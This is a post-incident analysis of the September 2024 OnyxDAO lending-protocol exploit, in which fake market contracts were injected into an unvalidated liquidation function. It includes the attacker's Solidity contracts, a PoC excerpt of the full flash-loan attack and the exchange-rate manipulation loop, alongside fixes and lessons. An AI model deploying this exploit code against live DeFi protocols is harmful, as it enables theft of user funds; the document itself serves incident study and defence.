# OnyxDAO — Unvalidated Input Vulnerability Analysis (2024)

| Field | Details |
|------|------|
| **Date** | 2024-09-26 |
| **Protocol** | OnyxDAO |
| **Chain** | Ethereum |
| **Loss** | $4,000,000 (4.1M VUSD, 7.35M XCN, 5K DAI, 0.23 WBTC, 50K USDT) |
| **Attacker** | [0x6809...F36B](https://etherscan.io/address/0x680910cf5fc9969a25fd57e7896a14ff1e55f36b) |
| **Attack Contract (Main)** | [0xa57e...8956](https://etherscan.io/address/0xa57eda20be51ae07df3c8b92494c974a92cf8956) |
| **Attack Tx** | [0x4656...8729](https://etherscan.io/tx/0x46567c731c4f4f7e27c4ce591f0aebdeb2d9ae1038237a0134de7b13e63d8729) |
| **Vulnerable Contract** | [NFTLiquidation 0xf10b...9002](https://etherscan.io/address/0xf10bc5be84640236c71173d1809038af4ee19002) |
| **Root Cause** | Fake Market injection via unvalidated user input → liquidation function abuse |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/OnyxDAO_exp.sol) |

> **Note**: OnyxDAO suffered a separate incident in 2023 (2023-11-01, ERC4626 inflation attack, ~$2M loss). This document covers only the September 2024 incident.

---

## 1. Vulnerability Overview

OnyxDAO is a decentralized lending protocol forked from Compound v2. On September 26, 2024, an attacker exploited the absence of input parameter validation in the `liquidateWithSingleRepay()` function of the `NFTLiquidation` contract.

**Core Vulnerability**: The `liquidateWithSingleRepay()` function accepts `oTokenRepay` (repay token) and `oTokenCollateral` (collateral token) parameters, but **does not verify whether these addresses are actually registered markets in the protocol**. The attacker deployed three fake contracts to bypass the liquidation logic:

1. `Fake_underlying` — A dummy token where all ERC20 functions (`transferFrom`, `approve`, `transfer`) always return `true`
2. `Fake_oTokenRepay` — A trigger contract that, when `transfer()` is called, actually executes `oVUSD.liquidateBorrow()`
3. `Fake_oTokenCollateral` — A dummy collateral contract that always returns 0

The attacker first manufactured a liquidatable position via oracle exchange rate manipulation (AttackerC2), then injected fake markets to drain funds under the guise of a legitimate liquidation.

**Vulnerability Combination**:
- **V-01** (Core): Unvalidated user input — `oTokenRepay`/`oTokenCollateral` addresses not verified (CWE-20)
- **V-02**: Flash loan combined attack — Balancer 2000 WETH flash loan utilized
- **V-03**: Exchange rate manipulation — oETH exchange rate manipulated via repeated `redeemUnderlying` calls

---

## 2. Vulnerable Code Analysis

### 2.1 liquidateWithSingleRepay() — Core Vulnerability

The `liquidateWithSingleRepay()` function of the NFTLiquidation contract (estimated lines 671–678):

**Vulnerable Code (estimated)**:
```solidity
// ❌ Vulnerable code: no input address validation
function liquidateWithSingleRepay(
    address payable borrower,
    address oTokenCollateral,  // ❌ Not verified to be a protocol-registered market
    address oTokenRepay,       // ❌ Attacker can inject arbitrary contract
    uint256 repayAmount
) external payable {
    // Does not check if oTokenRepay is an actually registered market
    // oTokenCollateral likewise allows arbitrary addresses
    
    address underlying = IOToken(oTokenRepay).underlying(); // Can return a fake underlying
    
    // Calls underlying.transferFrom() — always succeeds with a fake token
    IERC20(underlying).transferFrom(msg.sender, address(this), repayAmount);
    
    // Calls oTokenRepay.transfer() — fake contract executes malicious logic via callback
    IERC20(oTokenRepay).transfer(borrower, repayAmount); // ❌ Triggers arbitrary code execution
    
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Fixed code: whitelist-based market validation added
function liquidateWithSingleRepay(
    address payable borrower,
    address oTokenCollateral,
    address oTokenRepay,
    uint256 repayAmount
) external payable {
    // ✅ Must verify the market is registered in Unitroller
    require(
        IUnitroller(unitroller).isMarketListed(oTokenCollateral),
        "NFTLiquidation: oTokenCollateral is not a listed market"
    );
    require(
        IUnitroller(unitroller).isMarketListed(oTokenRepay),
        "NFTLiquidation: oTokenRepay is not a listed market"
    );
    
    // ✅ Remaining logic proceeds identically (applied only to validated markets)
    address underlying = IOToken(oTokenRepay).underlying();
    IERC20(underlying).transferFrom(msg.sender, address(this), repayAmount);
    // ...
}
```

**Problem**: The `NFTLiquidation` contract allows arbitrary addresses as `oTokenRepay` without referencing the market list registered in `Unitroller`. The `transfer()` function of the attacker-deployed `Fake_oTokenRepay` internally calls `oVUSD.liquidateBorrow()`, triggering a real protocol liquidation and seizing the collateral (oETH).

### 2.2 Fake_oTokenRepay — Callback-Based Malicious Logic

```solidity
// ❌ Fake liquidation token contract deployed by attacker
contract Fake_oTokenRepay {
    address fake_underlying;
    address attackerC;

    // Malicious logic that executes the moment NFTLiquidation calls transfer()
    function transfer(address, uint256) external returns (bool) {
        // ❌ Approve VUSD to oVUSD and execute real liquidation
        IFS(VUSD).approve(oVUSD, type(uint256).max);
        // ❌ Force-liquidate the attacker contract's (attackerC) ETH collateral
        IFS(oVUSD).liquidateBorrow(attackerC, 1, oETH);
        // ❌ Convert seized oETH to ETH
        uint256 bal_oETH = IFS(oETH).balanceOf(address(this));
        IFS(oETH).redeem(bal_oETH);
        // ❌ Send ETH to attacker
        payable(attackerC).transfer(address(this).balance);
        return true;
    }
}
```

### 2.3 oETH Exchange Rate Manipulation (AttackerC2)

```solidity
// ❌ Repeated mint/redeem for oETH exchange rate manipulation
contract AttackerC2 {
    function attack() external {
        uint256 x = 215_227_348 + 1; // Small ETH deposit
        uint256 y = 330_454_691 + 10; // Small oETH redemption

        IFS _oETH = IFS(oETH);
        oETH.call{value: x}(""); // Direct ETH transfer to increase cash

        // ❌ 54 iterations: redeemUnderlying + small ETH deposit
        // → Manipulate exchangeRate to induce a liquidatable state
        for (uint256 i; i < 54; i++) {
            _oETH.redeemUnderlying(y);
            oETH.call{value: x}(""); // Manipulate cash
        }
        _oETH.redeemUnderlying(y);
        payable(address(msg.sender)).transfer(address(this).balance);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker deployed 5 contracts at block 20,834,657:
  - Main attack contract (`AttackerC`)
  - Exchange rate manipulation contract (`AttackerC2`)
  - `Fake_oTokenRepay`, `Fake_underlying`, `Fake_oTokenCollateral`
- Attack block: **20,834,658** (2024-09-26)

### 3.2 Execution Phase

```
Step 1: Obtain Flash Loan
  └── Flash loan of 2,000 WETH (~$5.2M) from Balancer Vault

Step 2: ETH Conversion and oETH Minting
  └── Convert 2,000 WETH → ETH
  └── Mint oETH with 1,999.5 ETH (register as collateral)

Step 3: Enter All Markets
  └── Call Unitroller.enterMarkets(getAllMarkets())
  └── Participate as collateral in all lending markets

Step 4: Multi-Market Borrowing (maximum borrow against collateral)
  └── oXCN.borrow(getCash()) → Borrow all XCN → transfer to attacker
  └── oDAI.borrow(getCash()) → Borrow all DAI → transfer to attacker
  └── oBTC.borrow(getCash()) → Borrow all WBTC → transfer to attacker
  └── oUSDT.borrow(getCash()) → Borrow all USDT → transfer to attacker
  └── Calculate remaining collateral headroom via getAccountLiquidity()
  └── oVUSD.borrow(liq/1e12) → Borrow VUSD

Step 5: oETH Exchange Rate Manipulation (execute AttackerC2)
  └── Send 0.5 ETH to AttackerC2
  └── 54 iterations: redeemUnderlying(y) + small direct ETH deposit
  └── Manipulate oETH exchangeRate → AttackerC's position falls into liquidatable state

Step 6: Fake Market Liquidation Attack (core)
  └── Deploy Fake_underlying, Fake_oTokenCollateral, Fake_oTokenRepay
  └── Send 1 VUSD to Fake_oTokenRepay (prepare trigger)
  └── NFTLiquidationProxy.liquidateWithSingleRepay(
         borrower=AttackerC,
         oTokenCollateral=Fake_oTokenCollateral,  ← unvalidated input
         oTokenRepay=Fake_oTokenRepay,            ← unvalidated input
         repayAmount=4_764_735_291_322
      )
  └── NFTLiquidation calls Fake_oTokenRepay.transfer()
  └── [Callback] Inside Fake_oTokenRepay.transfer():
         └── VUSD.approve(oVUSD, MAX)
         └── oVUSD.liquidateBorrow(AttackerC, 1, oETH) → obtain oETH collateral
         └── oETH.redeem(full balance) → convert to ETH
         └── Transfer ETH to AttackerC

Step 7: VUSD → WETH Swap
  └── Swap 300B VUSD → WETH via Uniswap V3 Pool

Step 8: Flash Loan Repayment and Profit Realization
  └── WETH.deposit(ETH) → convert to WETH
  └── Repay 2,000 WETH to Balancer
  └── Transfer remaining VUSD to attacker EOA
```

### 3.3 Attack Flow Diagram

```
Attacker EOA (0x6809...F36B)
        │
        ▼
┌─────────────────────────┐
│  AttackerC (Main)       │
│  0xa57e...8956          │
└────────────┬────────────┘
             │ ① flashLoan(2000 WETH)
             ▼
┌─────────────────────────┐
│   Balancer Vault        │
│   (Flash Loan Provider) │
└────────────┬────────────┘
             │ ② Transfer 2000 WETH
             ▼
┌─────────────────────────┐
│  AttackerC              │──③ WETH→ETH, mint oETH
│  (Collateral: oETH)     │──④ Enter all markets
└────────────┬────────────┘
             │ ⑤ Maximum borrow from each market
             ▼
┌────────────────────────────────────────┐
│  oXCN / oDAI / oBTC / oUSDT / oVUSD   │
│  (Collateral-backed multi-market borrow)│
└────────────────────────────────────────┘
             │ ⑥ Send 0.5 ETH to AttackerC2
             ▼
┌─────────────────────────┐
│  AttackerC2             │──⑦ 54 iterations: redeem + direct ETH deposit
│  (Rate manipulation)    │    → Manipulate oETH exchangeRate
└────────────┬────────────┘
             │ ⑧ AttackerC position → liquidatable state
             ▼
┌─────────────────────────┐
│  Deploy Fake Contracts  │
│  - Fake_oTokenRepay     │
│  - Fake_underlying      │
│  - Fake_oTokenCollateral│
└────────────┬────────────┘
             │ ⑨ liquidateWithSingleRepay(AttackerC,
             │              Fake_oTokenCollateral,  ← unvalidated
             │              Fake_oTokenRepay,       ← unvalidated
             │              repayAmount)
             ▼
┌─────────────────────────┐
│  NFTLiquidationProxy    │
│  0x3233...3D44          │
│  → NFTLiquidation       │
│    0xf10b...9002        │
└────────────┬────────────┘
             │ ⑩ Fake_oTokenRepay.transfer() called (executed due to unvalidated input)
             ▼
┌─────────────────────────────────────────────┐
│  Fake_oTokenRepay.transfer() [callback abuse]│
│  ① VUSD.approve(oVUSD, MAX)                │
│  ② oVUSD.liquidateBorrow(AttackerC, 1, oETH)│  ← Real liquidation executed
│  ③ oETH.redeem(full balance)               │  ← Convert to ETH
│  ④ ETH → AttackerC transfer               │
└─────────────────────────────────────────────┘
             │ ⑪ 300B VUSD → Uniswap V3 → WETH
             ▼
┌─────────────────────────┐
│  Uniswap V3 Pool        │
│  (VUSD/WETH, fee 0.3%)  │
└────────────┬────────────┘
             │ ⑫ Repay Balancer 2000 WETH
             ▼
┌─────────────────────────┐
│  Attacker EOA           │
│  Final profit:          │
│  4.1M VUSD + WETH +     │
│  7.35M XCN + 5K DAI +   │
│  0.23 WBTC + 50K USDT   │
└─────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~$3.8M (4.1M VUSD, 7.35M XCN, 5K DAI, 0.23 WBTC, 50K USDT)
- **Protocol Loss**: ~$4,000,000
- **Flash Loan Principal**: 2,000 WETH (fully repaid)

---

## 4. PoC Code (Key Logic Excerpted from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// PoC Source: DeFiHackLabs (rotcivegaf)
// Fork Block: mainnet 20,834,657

// ══════════════════════════════════════════════
// Core Attack Flow — receiveFlashLoan() Summary
// ══════════════════════════════════════════════

function receiveFlashLoan(...) external {
    // [Step 1] Convert WETH → ETH and mint oETH (register collateral)
    IFS(weth).withdraw(balWETH);
    uint256 cashOETH1 = IFS(oETH).getCash();
    IFS(oETH).mint{value: balWETH - 0.5 ether}();

    // [Step 2] Enter all markets (diversify collateral)
    address[] memory markets = IFS(Unitroller).getAllMarkets();
    IFS(Unitroller).enterMarkets(markets);

    // [Step 3] Borrow all oETH cash (collateral > borrow condition satisfied)
    IFS(oETH).borrow(cashOETH1);

    // [Step 4] Borrow full getCash() from each market and transfer to attacker EOA
    uint256 cash0 = IFS(oXCN).getCash();
    IFS(oXCN).borrow(cash0);
    IFS(IFS(oXCN).underlying()).transfer(attacker, cash0); // Drain XCN

    uint256 cash1 = IFS(oDAI).getCash();
    IFS(oDAI).borrow(cash1);
    IFS(IFS(oDAI).underlying()).transfer(attacker, cash1); // Drain DAI

    // WBTC, USDT follow the same pattern...

    // [Step 5] Borrow VUSD with remaining collateral headroom
    (, uint256 liq,) = IFS(Unitroller).getAccountLiquidity(address(this));
    IFS(oVUSD).borrow(liq / 1e12);

    // [Step 6] oETH exchange rate manipulation (AttackerC2)
    AttackerC2 attackerC2 = new AttackerC2();
    payable(address(attackerC2)).transfer(0.5 ether);
    attackerC2.attack(); // 54 iterations of redeem+mint → induce liquidatable state

    // [Step 7] Deploy fake market contracts
    address fake_underlying = address(new Fake_underlying());
    address fake_oTokenCollateral = address(new Fake_oTokenCollateral());
    address fake_oTokenRepay = address(new Fake_oTokenRepay(fake_underlying, address(this)));

    IFS(VUSD).transfer(fake_oTokenRepay, 1); // Transfer 1 VUSD as trigger

    // ❌ Core vulnerability exploit: inject unvalidated oTokenRepay/oTokenCollateral
    IFS(NFTLiquidationProxy).liquidateWithSingleRepay(
        payable(address(this)),
        fake_oTokenCollateral, // ← Fake collateral contract
        fake_oTokenRepay,      // ← Fake contract that triggers real liquidation via callback
        4_764_735_291_322
    );
    // → Fake_oTokenRepay.transfer() is called, which:
    //   Executes oVUSD.liquidateBorrow(this, 1, oETH)
    //   → Force-liquidates oETH collateral and converts to ETH

    // [Step 8] VUSD → WETH swap (Uniswap V3)
    IFS(VUSD).approve(uniV3Router, 300_000_000_000);
    IFS(uniV3Router).exactInputSingle(...); // 300B VUSD → WETH

    // [Step 9] Repay flash loan
    IFS(weth).deposit{value: address(this).balance}();
    IFS(weth).transfer(balancerVault, 2000 ether); // Repayment complete

    // [Step 10] Transfer remaining VUSD to attacker EOA
    IFS(VUSD).transfer(attacker, IFS(VUSD).balanceOf(address(this)));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Unvalidated User Input (Fake Market Injection) | CRITICAL | CWE-20 | `03_access_control.md` |
| V-02 | Flash Loan Combined Attack | HIGH | CWE-841 | `02_flash_loan.md` |
| V-03 | oETH Exchange Rate Manipulation (Direct Cash Manipulation) | HIGH | CWE-682 | `16_accounting_sync.md` |

### V-01: Unvalidated User Input (Fake Market Injection)

- **Description**: `NFTLiquidation.liquidateWithSingleRepay()` does not cross-reference the `oTokenRepay` and `oTokenCollateral` addresses against the Unitroller's registered market list, allowing the attacker to inject arbitrary malicious contracts.
- **Impact**: The `Fake_oTokenRepay.transfer()` callback deployed by the attacker executes, triggering a real oVUSD liquidation and seizing all of the attacker's oETH collateral.
- **Attack Conditions**: An account with a liquidatable (unhealthy) position (which the attacker can manufacture through exchange rate manipulation), and pre-deployment of fake market contracts.

### V-02: Flash Loan Combined Attack

- **Description**: Initial capital obtained via an uncollateralized loan of 2,000 WETH from Balancer Vault. Within a single transaction, large collateral acquisition, multi-market borrowing, fake liquidation, fund recovery, and repayment all occur.
- **Impact**: The attacker executes the entire attack cycle with a ~$5.2M flash loan and zero real capital, pocketing profits with no risk of loss.
- **Attack Conditions**: Access to a flash loan provider (Balancer), profit realization within a single transaction.

### V-03: oETH Exchange Rate Manipulation

- **Description**: `AttackerC2` repeats `redeemUnderlying()` and direct ETH transfers (`.call{value: x}("")`) 54 times to manipulate oETH's `exchangeRate`. In the formula `exchangeRateStored = (totalCash + totalBorrows - totalReserves) / totalSupply`, totalCash is artificially inflated and deflated to shift the exchange rate.
- **Impact**: The oETH collateral value of AttackerC drops, causing the position to become liquidatable, which gives the fake market liquidation attack its effectiveness.
- **Attack Conditions**: Mint/redeem access to the oETH market (public functions), sufficient ETH balance.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Recommendation 1] Add market validation to liquidateWithSingleRepay()**

```solidity
// ✅ Fix: Unitroller whitelist-based validation
function liquidateWithSingleRepay(
    address payable borrower,
    address oTokenCollateral,
    address oTokenRepay,
    uint256 repayAmount
) external payable {
    // ✅ Verify both parameters are registered markets
    require(
        IComptroller(unitroller).isMarketListed(oTokenCollateral),
        "NFTLiquidation: invalid collateral market"
    );
    require(
        IComptroller(unitroller).isMarketListed(oTokenRepay),
        "NFTLiquidation: invalid repay market"
    );
    // Continue with existing logic
}
```

**[Recommendation 2] Apply Checks-Effects-Interactions (CEI) Pattern Before External Calls**

```solidity
// ✅ Checks-Effects-Interactions pattern
function liquidateWithSingleRepay(...) external {
    // Check: Input validation
    require(isMarketListed(oTokenCollateral), "...");
    require(isMarketListed(oTokenRepay), "...");

    // Effects: State changes first
    _updateLiquidationState(borrower, repayAmount);

    // Interactions: External calls last
    IOToken(oTokenRepay).transfer(borrower, repayAmount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 (Unvalidated Input) | Mandate whitelist validation via Unitroller `markets` mapping |
| V-01 (Unvalidated Input) | Verify same validation is applied to `liquidateWithSingleRepayV2` |
| V-02 (Flash Loan) | Add monitoring to detect large-scale borrow+liquidation patterns within a single block |
| V-03 (Rate Manipulation) | Defensive recalculation logic when cash increases via direct ETH transfer (`receive()`) |
| V-03 (Rate Manipulation) | Consider limiting `exchangeRate` delta or using a TWAP-based exchange rate |
| General | Periodically review whether upstream patches are applied when using Compound v2 forks |
| General | Consider separate access control for liquidation functions (EOA-only or whitelisted liquidators) |

---

## 7. Lessons Learned

1. **Always validate externally-injected contract addresses**: In DeFi protocols, contract addresses used in financial logic such as `liquidation`, `repay`, and `collateral` must be verified against a whitelist managed by the protocol (e.g., the Comptroller's `markets` mapping). Blindly trusting addresses supplied by `msg.sender` leads to arbitrary code execution.

2. **Compound v2 forks must proactively track upstream patches**: OnyxDAO is a Compound v2 fork protocol, and this vulnerability originated in the additionally developed `NFTLiquidation` feature beyond the base code. Fork protocols must understand the security model of the underlying code and apply the same level of security validation when developing additional features.

3. **A single function's missing input validation can put an entire protocol's funds at risk**: The missing parameter validation in just `liquidateWithSingleRepay()` directly resulted in ~$4M in losses. All entry points through which large amounts of protocol funds flow must undergo rigorous security review including fuzz testing and formal verification.

4. **Design defenses against exchange rate (exchangeRate) manipulation**: In Compound-based protocols, the formula `exchangeRate = (cash + borrows - reserves) / totalSupply` allows `cash` to be manipulated by directly sending ETH from outside. Restricting the `receive()` function or applying a TWAP-based exchange rate should be considered.

5. **Flash loans amplify attack scale without limit and without capital**: In this attack, the flash loan was not merely leverage — it was the core tool that made the attack possible in the first place. Protocols must build on-chain monitoring for patterns where flash loans + large-scale borrowing + liquidation occur within a single transaction.

6. **Comparison with OnyxDAO's 2023 Incident**: Both the 2023 incident (ERC4626 inflation, ~$2M) and the 2024 incident ($4M) share the same root cause: missing input/state validation. Post-incident security audits should not merely verify that existing vulnerabilities are patched, but conduct comprehensive audits of all newly added features.

---

## 8. On-Chain Verification

### 8.1 Basic Transaction Information

| Field | Value |
|------|-----|
| **Block Number** | 20,834,658 |
| **Tx Status** | Success (status: 1) |
| **From (Attacker EOA)** | 0x680910cf5Fc9969A25Fd57e7896A14fF1E55F36B |
| **To (Attack Contract)** | 0xa57eDA20Be51Ae07Df3c8B92494C974a92cf8956 |
| **Gas Used** | 8,969,591 |
| **Gas Limit** | 10,961,285 |

### 8.2 PoC vs On-Chain Amount Comparison

| Field | PoC Value | On-Chain Verified | Notes |
|------|--------|------------|------|
| Flash Loan Size | 2,000 WETH | Confirmed (`0x6c6b935b8bbd400000` = 2000e18) | Balancer Transfer event |
| Attack Block | 20,834,658 | Confirmed | Matches vm.createSelectFork |
| Attack Tx | `0x46567c...d8729` | Confirmed | Matches PoC @KeyInfo |
| VUSD Swap | 300,000,000,000 (300B) | Confirmed | Uniswap V3 SwapParams |
| Total Loss | ~$3.8M | ~$4M (disclosed) | Reflects token price fluctuations |

### 8.3 Auxiliary Attack Contract List (On-Chain Verified)

| Role | Address |
|------|------|
| Main Attack Contract | [0xa57e...8956](https://etherscan.io/address/0xa57eda20be51ae07df3c8b92494c974a92cf8956) |
| Exchange Rate Manipulation Contract | [0xae7d...a223](https://etherscan.io/address/0xae7d68b140ed075e382e0a01d6c67ac675afa223) |
| Fake oTokenRepay | [0x4f8b...d068](https://etherscan.io/address/0x4f8b8c1b828147c1d6efc37c0326f4ac3e47d068) |
| Fake underlying | [0x3f10...0e](https://etherscan.io/address/0x3f100c9e9b9c575fe73461673f0770435575dc0e) |
| Fake oTokenCollateral | [0xad45...a248](https://etherscan.io/address/0xad45812c62fcbc8d54d0cc82773e85a11f19a248) |

### 8.4 Related References

- PeckShield Alert: https://x.com/peckshield/status/1839302663680438342
- Etherscan Tx: https://etherscan.io/tx/0x46567c731c4f4f7e27c4ce591f0aebdeb2d9ae1038237a0134de7b13e63d8729
- Vulnerable Contract Source: https://etherscan.io/address/0xf10bc5be84640236c71173d1809038af4ee19002#code